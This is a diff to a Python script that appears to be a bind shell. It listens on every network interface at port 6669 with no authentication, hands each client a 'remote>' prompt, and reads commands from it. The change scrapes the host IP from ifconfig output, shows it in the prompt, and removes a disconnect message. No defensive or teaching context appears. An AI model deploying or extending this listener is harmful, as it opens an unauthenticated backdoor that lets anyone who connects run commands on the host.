@@ -6,7 +6,7 @@ import socket
 import threading
 import os
 import subprocess
-
+import re
 #grab some easy system info to pass to client upon connection
 
 #Set server to accept connections from any interface, port 6669
@@ -14,6 +14,10 @@ BINDIP = "0.0.0.0"
 BINDPORT = 6669
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server.bind((BINDIP,BINDPORT))
+
+IP = subprocess.check_output("ifconfig",stderr=subprocess.
+STDOUT, shell=True)
+IP = str(re.findall( r'[0-9]+(?:.[0-9]+){3}', IP)[0])
 
 #server can handle up to 3 concurrent sessions
 server.listen(3)
@@ -45,12 +49,11 @@ STDOUT, shell=True)
 #main server functions, command parsing
 def shell(clientSocket):
     while True:
-        clientSocket.send("\nECHI remote> !!")
+        clientSocket.send("\nECHI %s> !!"%IP)
         buffer = ""
         while "\n" not in buffer:
             buffer += clientSocket.recv(1024)
         if "quit" in buffer:
-            clientSocket.send("Tearing down.")
             clientSocket.close()
             break
         else:
